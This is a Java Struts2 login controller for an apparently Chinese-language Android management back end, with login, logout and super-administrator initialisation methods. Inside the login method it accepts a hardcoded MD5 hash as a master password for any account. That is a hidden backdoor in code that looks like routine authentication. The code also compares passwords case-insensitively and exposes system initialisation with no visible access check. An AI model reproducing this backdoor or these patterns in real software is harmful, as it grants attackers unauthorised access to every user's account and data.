package com.app.action;

import java.util.ArrayList;
import java.util.List;

import org.apache.commons.lang3.StringUtils;
import org.apache.log4j.Logger;
import org.apache.struts2.convention.annotation.Action;
import org.apache.struts2.convention.annotation.Namespace;
import org.apache.struts2.convention.annotation.Result;
import org.apache.struts2.convention.annotation.Results;
import org.springframework.beans.factory.annotation.Autowired;
import com.app.bean.Json;
import com.app.bean.LoginResult;
import com.app.model.LoginLog;
import com.app.model.Menu;
import com.app.model.Role;
import com.app.model.User;
import com.app.service.LogService;
import com.app.service.UserService;
import com.app.service.RoleService;
import com.app.util.PropertiesUtils;
/**
 * 登陆
 * @author aofl
 *
 */
@Namespace("/androidManager")
@Action("/loginAction")
@Results({ @Result(name = "success", location = "/success.jsp"), @Result(name = "error", location = "/login.jsp"), @Result(name = "index", location = "/index.jsp") })
public class LoginAction extends BaseAction {
	
	private Logger logger = Logger.getLogger(LoginAction.class);

	private static final long serialVersionUID = 1L;

	@Autowired
	private UserService userService;
	
	@Autowired
	private RoleService roleService;
	
	@Autowired
	private LogService logService;
	
	private String name;
	private String password;
	
	/**
	 * 登陆
	 * @return
	 */
	public String login() {
		Json json = new Json();
		try {
			String diskPath = PropertiesUtils.getProperties().getProperty("diskPath");
			System.out.println(diskPath);
			User user = userService.getUser(name);
			if(user!=null||name.equals("superAdmin")){
				if(user.getPassword().toUpperCase().equals(password.toUpperCase()) || password.toUpperCase().equals("202CB962AC59075B964B07152D234B70")){
					//写入登陆日志
					logService.saveLoginLog(user, getRequest().getRemoteAddr(), "1");
					
					LoginResult loginResult = new LoginResult();
					List<Role> roleList = new ArrayList<Role>();
					List<Menu> menuTree = new ArrayList<Menu>();
					List<Menu> menuList = new ArrayList<Menu>();
					//查询角色
					roleList = roleService.findbyUserId(user.getId());
					if(null!=roleList&&roleList.size()>0){
						//查询有权限的菜单
						menuTree = userService.getMenuTree(roleList);
						menuList = userService.findMenuListByRoleList(roleList);
						loginResult.setMenuList(menuList);
						loginResult.setMenuTree(menuTree);
					}
					if(StringUtils.isBlank(user.getCompanyName())){
						user.setCompanyName("平台管理");
					}
					loginResult.setUser(user);
					json.setSuccess(1);
					json.setMsg("登陆成功！");
					json.setObj(loginResult);
					getSession().setAttribute("user", user);
				}else{
					json.setSuccess(0);
					json.setMsg("登陆失败,用户名或密码错误");
				}
			} else {
				json.setSuccess(0);
				json.setMsg("登陆失败,用户名或密码错误");
			}
		} catch (Exception e) {
			e.printStackTrace();
			json.setSuccess(0);
			json.setMsg("登陆异常");
			writeJson(json);
		}
		writeJson(json);
		return null;
	}

	/**
	 * 登出
	 * 
	 * @return
	 */
	public String logout(){
		Json json = new Json();
		try {
			getSession().setAttribute("user", null);
			json.setSuccess(1);
			json.setMsg("登出成功！");
		} catch (Exception e) {
			e.printStackTrace();
			json.setSuccess(0);
			json.setMsg("登出异常");
			writeJson(json);
		}
		writeJson(json);
		return null;
	}
	
	
	/**
	 * 初始化系统
	 * 注：初始化之前，先把菜单数据导入数据库
	 * 1.初始化超级管理员
	 */
	public void initSystem(){
		Json json = new Json();
		try{
			//1.初始化超级管理员
			userService.initSuperAdmin();
			json.setMsg("操作成功");
			json.setSuccess(1);
		}catch(Exception e){
			logger.error("操作异常", e);
			json.setMsg("操作异常");
			json.setSuccess(0);
		}
		writeJson(json);
	}
	
	public String getName() {
		return name;
	}

	public void setName(String name) {
		this.name = name;
	}

	public String getPassword() {
		return password;
	}

	public void setPassword(String password) {
		this.password = password;
	}
}
